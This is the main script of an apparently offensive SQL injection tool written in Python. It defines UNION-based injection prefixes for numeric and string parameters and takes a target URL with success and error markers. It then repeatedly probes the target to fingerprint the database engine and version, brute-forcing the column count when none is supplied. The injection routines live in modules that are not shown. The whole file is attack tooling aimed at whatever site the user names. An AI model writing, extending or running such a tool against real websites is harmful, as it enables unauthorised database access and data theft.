from sys import argv, exit
from requests import ConnectionError
from time import sleep
from enum import Enum


# Local Modules
from determine import determine_dbms
from parser import parse_args
import printer


class Poison(Enum):
    NUMERIC = "0 UNION "
    ALNUM = "' UNION "


if __name__ == "__main__":
    if "--help" in argv or "-h" in argv:
        printer.usage()
        exit(1)

    printer.banner()

    opts = parse_args(argv)
    print(r"[ ] Running version check...")

    brute_force = opts.COLUMNS is None
    if brute_force:
        print(r"[!] Columns missing, using brute force mode")

    tries = 0
    while (True):
        try:
            version = determine_dbms(
                opts.URL, opts.SUCCESS_STR, opts.ERROR_STR, Poison.ALNUM.value, int(opts.COLUMNS or "0"), brute_force)
            if version is None:
                version = determine_dbms(
                    opts.URL, opts.SUCCESS_STR, opts.ERROR_STR, Poison.NUMERIC.value, int(opts.COLUMNS or "0"), brute_force)

            break
        except ConnectionError:
            sleep(1)
            tries += 1

            if tries >= 5:
                print("\n[x] Could not connect to specified URL")
                exit(1)

    if version is not None:
        print("\n[*] Got version " + version.name)
    elif brute_force:
        printer.brute_force_error()
        exit(1)
    else:
        printer.column_error()
        exit(1)
